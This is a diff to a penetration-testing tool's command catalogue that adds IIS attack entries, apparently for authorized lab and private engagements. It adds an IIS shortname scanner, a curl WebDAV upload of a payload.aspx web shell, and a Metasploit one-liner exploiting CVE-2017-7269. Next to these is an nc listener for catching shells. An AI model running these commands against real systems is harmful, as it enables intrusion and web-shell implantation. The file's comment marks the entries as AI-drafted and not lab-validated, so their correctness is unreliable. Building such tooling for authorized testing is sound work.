@@ -988,6 +988,39 @@ export const PHASES: Phase[] = [
             command: 'mkdir -p engagements/{target}/exploit && nc -lvnp 4444 | tee -a engagements/{target}/exploit/listener-$(date +%Y%m%d-%H%M).log',
             mitreTechniques: ['T1071.001', 'T1059.004'],
           },
+          /* IIS exploit pack — AI-drafted 2026-04-29, not yet
+             lab-validated. Three real attack paths against
+             classic IIS deployments: shortname filesystem
+             enumeration (CVE-2010-2731, IIS 6-8.5), authenticated
+             WebDAV upload-then-execute, and the canonical
+             CVE-2017-7269 WebDAV-buffer-overflow Metasploit
+             module. The shortname scanner is recon-y but lives
+             here because its output directly drives the next
+             exploit choice. */
+          {
+            label: 'IIS shortname scanner (CVE-2010-2731)',
+            command: 'java -jar iis_shortname_scanner.jar 2 20 https://{target}',
+            techApplies: ['iis'],
+            osApplies: ['windows'],
+            mitreTechniques: ['T1083'],
+            appliesTo: ['private', 'lab'],
+          },
+          {
+            label: 'WebDAV PUT upload (auth required)',
+            command: 'curl -X PUT https://{target}/{filename}.txt --upload-file payload.aspx -u \'{domain}\\{user}:{password}\' -v',
+            techApplies: ['iis'],
+            osApplies: ['windows'],
+            mitreTechniques: ['T1505.003'],
+            appliesTo: ['private', 'lab'],
+          },
+          {
+            label: 'msfconsole — IIS WebDAV bypass (CVE-2017-7269)',
+            command: 'msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS {target}; set RPORT 80; check; exploit"',
+            techApplies: ['iis'],
+            osApplies: ['windows'],
+            mitreTechniques: ['T1190'],
+            appliesTo: ['private', 'lab'],
+          },
         ],
         branches: [
           { if: 'access landed', goto: 'post-ex' },
@@ -999,6 +1032,11 @@ export const PHASES: Phase[] = [
           { name: 'ysoserial', url: 'https://github.com/frohoff/ysoserial', kind: 'cli', note: 'Java deserialization payloads', techApplies: ['java'] },
           { name: 'ysoserial.net', url: 'https://github.com/pwntester/ysoserial.net', kind: 'cli', note: '.NET deserialization payloads', techApplies: ['dotnet'] },
           { name: 'WPScan', url: 'https://github.com/wpscanteam/wpscan', kind: 'cli', note: 'WordPress vuln scanner (token recommended for plugin DB)', techApplies: ['wordpress'] },
+          /* IIS-tagged finding-tools so the Map can attribute
+             findings under IIS to the right tool node — flips
+             "no tagged tool" gap and lets the iis sub-tree
+             actually grow. */
+          { name: 'IIS-ShortName-Scanner', url: 'https://github.com/irsdl/IIS-ShortName-Scanner', kind: 'cli', note: 'Enumerates IIS short-name (8.3) filesystem entries — discovery before targeted exploitation', techApplies: ['iis'], osApplies: ['windows'] },
         ],
       },
       {
